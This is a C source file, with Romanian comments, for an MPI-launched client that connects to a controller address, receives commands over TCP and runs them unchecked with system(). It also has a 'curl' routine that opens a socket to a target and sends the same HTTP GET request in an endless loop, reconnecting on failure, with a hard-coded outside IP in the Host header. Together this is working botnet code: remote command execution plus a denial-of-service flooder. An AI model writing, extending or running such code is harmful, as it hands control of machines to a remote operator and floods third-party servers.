#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <mpi.h>
#include <signal.h>

#define BUFLEN 256

void exec_curl(char *buff)
{
	sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGPIPE);
        sigprocmask(SIG_BLOCK, &sigs, 0);
	int i;
	char *token;
	char ip[BUFLEN] = "127.0.0.1";
	int portno = 80;
	int total, sent, received, bytes;

	char response[4096];
	char message[1024] = "GET / HTTP/1.0\r\nHost: 89.136.163.221:8080\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n";
	
	struct sockaddr_in serv_addr;
	int sockfd;

	token = strtok(buff, " ");
	token = strtok(NULL, ":");
	strcpy(ip, token);
	token = strtok(NULL, " ");
	portno = atoi(token);

	printf("IP: %s; Port: %d\n", ip, portno);

restart_socket:
	/* create the socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) perror("ERROR opening socket");

	memset(&serv_addr,0,sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(portno);
	inet_aton(ip, &serv_addr.sin_addr);

	/* connect the socket */
	if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0)
		perror("ERROR connecting");
	printf("S-a conectat\n");
	for (;;) {


		/* send the request */
		total = strlen(message);
		sent = 0;
		do {
			bytes = write(sockfd,message+sent,total-sent);
			if (bytes < 0)
				goto restart_socket;
			if (bytes == 0)
			    break;
			sent+=bytes;
		} while (sent < total);
	}
	printf("AM TRIMIS\n");
}

void process_work(char *ip, int port)
{
	struct sockaddr_in tcp_addr;
	int tcp_fd;
	char buffer[BUFLEN];
	fd_set read_fds, aux_read;
	int fdmax;

	/*  Deschiderea socketilor  */
	tcp_fd = socket(AF_INET, SOCK_STREAM, 0);
	if(tcp_fd < 0) {
		perror("Eroare deschidere socket tcp!");
		exit(1);
	}
	fdmax = tcp_fd;

	/*  Setare sockaddr_in  */
	memset((char *)&tcp_addr, 0, sizeof(tcp_addr));
	tcp_addr.sin_family = AF_INET;
	tcp_addr.sin_port = htons(port);
	inet_aton(ip, &tcp_addr.sin_addr);

	/*  Golire descriptori  */
	FD_ZERO(&read_fds);
	FD_ZERO(&aux_read);

	/*  Setare file descriptori  */
	FD_SET(0, &read_fds);
	FD_SET(tcp_fd, &read_fds);

	/*  Conectare prin tcp  */
	if(connect(tcp_fd, (struct sockaddr*) &tcp_addr, sizeof(tcp_addr)) < 0) {
		perror("Eroare la conectare prin tcp!");
		exit(1);
	}

	while(1) {
		aux_read = read_fds;
		memset(buffer, 0, sizeof(buffer));
		select(fdmax + 1, &aux_read, NULL, NULL, NULL);

		if(FD_ISSET(tcp_fd, &aux_read)) {
			recv(tcp_fd, buffer, BUFLEN, 0);
			printf("DEBUG: %s\n", buffer);
			if (strncmp(buffer, "curl", 4) == 0)
				exec_curl(buffer);
			else
				system(buffer);
		}
	}
}

int main(int argc, char **argv)
{

	if (argc != 3) {
		printf("Usage: ./client IP PORT\n");
		return -1;
	}

	MPI_Init(NULL, NULL);
	
	int comm_size;
	int comm_rank;

	MPI_Comm_size(MPI_COMM_WORLD, &comm_size);
	MPI_Comm_rank(MPI_COMM_WORLD, &comm_rank);
	
	process_work(argv[1], atoi(argv[2]));

	MPI_Finalize();

	return 0;
}
